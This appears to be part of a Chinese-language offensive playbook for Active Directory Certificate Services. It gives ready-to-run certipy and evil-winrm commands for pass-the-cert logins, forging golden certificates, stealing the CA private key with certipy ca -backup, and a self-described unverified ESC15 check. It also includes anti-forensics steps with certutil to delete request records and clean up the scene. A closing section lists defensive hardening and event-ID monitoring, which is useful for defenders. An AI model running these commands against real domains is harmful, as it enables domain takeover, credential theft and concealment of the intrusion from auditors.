- `-upn` / `-dns` / `-sid` / `-subject`:身份四件套,SID 最稳(不受 UPN 改名影响)
- `-template <pfx>`:克隆某张已有证书的全部属性(留 EKU/扩展)
- `-application-policies 'Client Authentication'`:显式指定应用策略 OID
- `-validity-period <天数>`:有效期(默认 365,黄金证书可拉长)
- `-out` / `-pfx-password`:输出文件与密码

注意: 黄金证书能用前提是该 CA 在域的 NTAuth 存储里受信任(企业 CA 默认满足);CA 私钥的 PFX 密码在 `-backup` 输出里给出(certipy v5 会自动尝试导出 Key Archival 相关密钥);`-subject` 的 DN 拼写要和目标对象真实 DN 一致,可用 `ldapdomaindump` 或 BloodHound 核对。

## 证书进入 RDP / WinRM — pass-the-cert 落地

原理一句话:PFX 一拆为 PEM 公钥+私钥,WinRM 走 TLS 客户端证书(evil-winrm -c/-k),LDAP 走 Schannel(certipy auth -ldap-shell),RDP 走智能卡/PKINIT 思路——证书本身就是一张无密码身份。

来源:evil-winrm 为 apt 包(/usr/bin/evil-winrm v4.1);证书拆分为 certipy cert

```bash
certipy cert -pfx administrator.pfx -nokey -out administrator.crt    # 拆出 PEM 公钥证书(-nokey 不含私钥)
certipy cert -pfx administrator.pfx -nocert -out administrator.key   # 拆出 PEM 私钥(-nocert 不含证书)
evil-winrm -i <目标IP> -P 5986 -S -c administrator.crt -k administrator.key    # TLS 客户端证书直连 HTTPS WinRM(5986),免密免哈希
certipy auth -pfx administrator.pfx -ldap-shell -dc-ip <DC的IP>    # Schannel 直连 LDAPS 交互 shell:# 提示符下可 add_user / set_password / grant_control 等
certipy auth -pfx administrator.pfx -dc-ip <DC的IP>    # 通用兜底:换 NT 哈希 + TGT,再按 05 文档 PTH/Kerberos 横向
```

RDP 思路(mstsc 智能卡):证书含客户端认证 EKU 且域信任该 CA 时,Kerberos PKINIT 直接接受证书换票——

- Linux 侧 xfreerdp 不支持客户端证书认证,实战路径是先 `certipy auth` 换出哈希/票据,再常规 RDP(哈希过 RDP 需Restricted Admin 模式:`xfreerdp /u:administrator /pth:<NT哈希> /rdg...` 仅特定配置可用,通用做法是用票据)
- Windows 跳板侧 mstsc:把 PFX 连私钥导入"当前用户\个人"证书存储(或智能卡),连接时凭据选择"智能卡证书",mstsc 会用证书走 CredSSP/PKINIT 完成认证——等价于把 pass-the-cert 移植到图形登录
- 机器证书(DomainController/Computer 模板)带服务器认证 EKU,还可用于中间人/伪造服务端

参数速查(certipy cert | evil-winrm):

- certipy cert `-pfx <输入>` + `-password`:读入 PFX;`-nokey`/`-nocert`:输出只要证书/只要私钥
- certipy cert `-key <pem>` + `-cert <pem>` + `-export`:反向把 PEM 合并回 PFX
- evil-winrm `-c <公钥证书>` + `-k <私钥>`:TLS 客户端证书对;`-S` 开 SSL,`-P 5986` 指定 HTTPS 端口
- certipy auth `-ldap-shell`:Schannel 进 LDAPS;`-kirbi`:票据存 kirbi(喂 Rubeus 类工具)

注意: evil-winrm 证书登录要求目标开了 HTTPS WinRM(5986)且允许客户端证书映射,纯 5986 HTTP 上不可用,先用 `nxc winrm <目标IP> -u '' -p '' --check-proto http https` 类探测确认端口形态;LDAP shell 里改密码/授权直接写目录,动静小但 LDAPS 审计可见;PFX 拆出的私钥文件按敏感凭据对待,用完即删。

## ESC15 — 证书模板 SchemaVersion 滥用【思路级 · 未实证】

来源:2025-01 社区公开(ly4k 研究方向);本机 certipy 5.1.0 **无自动检测**,一手博客在本机网络不可达,以下为思路级描述+手工判定步骤,拿不准处以〔待验证〕标注。

**原理(一句话)**:旧版 `msPKI-Schema-Security`/`SchemaVersion=1` 的模板在某些 CA 版本上跳过新版校验——申请者提交的 SAN/主题信息不再被服务端清洗,等价于 ESC1 的自填 SAN 效果。

```bash
# 手工判定三步(代替 certipy find 的自动检测):
# ① 找 SchemaVersion=1 且带客户端认证 EKU 的已发布模板
nxc ldap <DC的IP> -u '<用户>' -p '<密码>' -M ... 2>/dev/null || \
ldapsearch -x -H ldap://<DC的IP> -D '<域名>\<用户>' -w '<密码>' \
  -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,<域DN>' \
  '(&(msPKI-Schema-Security=*)(msPKI-Certificate-Name-Flag=*))' cn msPKI-Schema-Security msPKI-Certificate-Name-Flag 2>/dev/null | head -40
# ② 命中 SchemaVersion=1 + 供应方指定主题可覆盖(CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT=1)〔判定条件待验证〕
# ③ 直接按 ESC1 姿势申请:certipy req -template <命中模板> -upn administrator@<域名> ... (同 ESC1 命令块)
```

注意:此节为**研究方向占位**——实战遇 2025 后新建域时值得手工核;已实证打法仍以 ESC1-8/11-13 为准。certipy 新版(>5.1)若发布 ESC15 检测,`pipx upgrade certipy-ad` 后以 find 输出为准。

## certipy ca -backup 与痕迹清理

来源:pipx 包 `certipy` v5.1.0;certutil 为 CA 服务器本地命令(需 CA 管理员在场执行或已有 shell)

```bash
certipy ca -u '<CA管用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -backup    # 备份 CA 证书+私钥到本地 <CA名>.pfx(既是 forge 黄金证书原料,也是撤离时"带走凭据"的手段)
certipy ca -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -list-templates    # 收尾核对:确认没有意外启用/禁用的模板
certipy template -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -template '<ESC4改过的模板>' -write-configuration old_config.json   # ESC4 改过的模板按备份恢复原配置
# 以下在 CA 服务器本地执行(远程 shell / 跳板 RDP 后),删除攻击产生的申请记录:
certutil -deleterow <请求ID> request    # 删除指定 Request ID 的挂起/失败申请记录
certutil -revoke <证书序列号>           # 吊销已签发的攻击证书(序列号在 CA 数据库或证书详情里)
```

参数速查(certipy ca):

- `-backup`:拉取 CA 证书+私钥(需要 CA 管理员/Backup Operator 级权限,ESC7 打通后可用)
- `-list-templates` / `-enable-template` / `-disable-template`:模板发布状态核对与还原
- `-deny-request <请求ID>`:驳回挂起申请(清现场用)
- `-config '<CA主机名>\<CA名>'`:显式 CA 配置串

注意: CA 数据库里"已颁发"记录无法用 -deleterow 无痕抹除(deleterow 只处理挂起/失败),只能吊销+让审计去解释;撤离清单:恢复模板配置(ESC4)、吊销攻击证书、删除 PFX/PEM/PFX 密码等本地产物;`-backup` 本身会在 CA 留备份事件日志。

## 防御视角 — AD CS 加固基线

以上每条攻击链都对应一个可收敛的配置面,按层排查:

- 模板层:高危模板去掉 `ENROLLEE_SUPPLIES_SUBJECT` 标志(供应 SAN 权);严格 EKU(客户端认证模板绝不给 Any Purpose/无 EKU);注册权从 Authenticated Users 收敛到具体组(ESC1/2/3 根因)
- 模板 ACL:模板对象、`CN=Public Key Services` 容器的写权限每年审计一次(ESC4/ESC5 根因),dacledit/`certipy find -hide-admins` 可复用为自查工具
- CA 层:关闭 HTTP Web Enrollment(ESC8 根因;必须保留时强制 HTTPS+信道绑定);ESC11 场景开启 ICPR 强制加密;`EDITF_ATTRIBUTESUBJECTALTSTATUS2` 标志清零(ESC6);Manage CA / Manage Certificates 只留给专用账号(ESC7),CA 私钥可导出属性禁用
- 监控:AD CS 事件 4886(收到申请)/ 4887(签发)/ 4888(驳回)出现异常模板名或异常账户组合即告警;4768(Kerberos)里带证书信息字段(PKINIT 登录)统计"无智能卡用户却走证书认证";5136 监控模板/CA 对象属性修改(ESC4/ESC5 痕迹);NTAuth 存储变更列为最高级别告警(黄金证书植入面)
- 溯源演练:`certipy find` 本身就是最好的自检工具,把它加入例行 AD 健康检查,`grep ESC` 为零才算达标
